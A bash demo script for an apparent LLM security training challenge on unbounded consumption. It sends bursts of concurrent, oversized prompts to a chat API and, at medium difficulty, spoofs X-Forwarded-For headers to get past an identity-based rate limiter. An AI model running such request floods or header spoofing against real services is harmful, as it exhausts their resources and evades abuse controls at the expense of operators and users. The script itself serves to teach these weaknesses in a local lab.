#!/usr/bin/env bash
# unbounded_consumption_demo.sh — Challenge 6 (LLM06: Unbounded Consumption).
#
# Fires a burst of concurrent requests at CH6 and lets you watch /api/stats
# (also shown on the challenge page) respond. Behavior depends on the
# difficulty you picked on the challenge page - pass the same one here:
#
#   easy     - no limiter at all. Watch avg_latency_seconds climb freely.
#   medium   - a per-header rate limit (5 req/15s). This script also shows
#              the classic bypass: spoofing a different X-Forwarded-For per
#              request gets around it entirely, since the limiter trusts a
#              client-supplied header as identity.
#   extreme  - a per-session limit (3 req/15s) PLUS a global concurrency cap
#              that isn't tied to any identity at all. Header spoofing does
#              nothing against the concurrency cap - that's the point.
#
# Usage: ./unbounded_consumption_demo.sh [host] [difficulty] [concurrency] [rounds]
set -euo pipefail

HOST="${1:-http://localhost:5000}"
DIFFICULTY="${2:-easy}"
CONCURRENCY="${3:-8}"
ROUNDS="${4:-5}"

BIG_PROMPT=$(printf 'Please summarize TechNova'\''s return policy in detail. %.0s' {1..200})

echo "Target: $HOST  |  difficulty: $DIFFICULTY  |  concurrency: $CONCURRENCY  |  rounds: $ROUNDS"
echo "Baseline stats:"
curl -s "$HOST/api/stats"
echo

fire_one() {
    local spoofed_header=()
    if [[ "$DIFFICULTY" == "medium" ]]; then
        # Bypass attempt: a different apparent source per request.
        spoofed_header=(-H "X-Forwarded-For: 10.$((RANDOM % 255)).$((RANDOM % 255)).$((RANDOM % 255))")
    fi
    curl -s -o /dev/null -w "%{http_code} " "${spoofed_header[@]}" -X POST "$HOST/api/chat" \
        -H "Content-Type: application/json" \
        -d "{\"challenge\":\"ch6\",\"difficulty\":\"$DIFFICULTY\",\"history\":[{\"role\":\"user\",\"content\":$(jq -Rs . <<< "$BIG_PROMPT")}]}"
}

for round in $(seq 1 "$ROUNDS"); do
    echo "--- round $round: firing $CONCURRENCY concurrent requests ---"
    for _ in $(seq 1 "$CONCURRENCY"); do
        fire_one &
    done
    wait
    echo
    echo "Stats after round $round:"
    curl -s "$HOST/api/stats"
    echo
done

echo "Done. Status codes above: 200 = served, 429 = rate limited."
echo "Compare avg_latency_seconds/total_requests against the baseline."
if [[ "$DIFFICULTY" == "medium" ]]; then
    echo "If you saw mostly 200s despite high concurrency, the X-Forwarded-For spoofing bypass worked."
fi
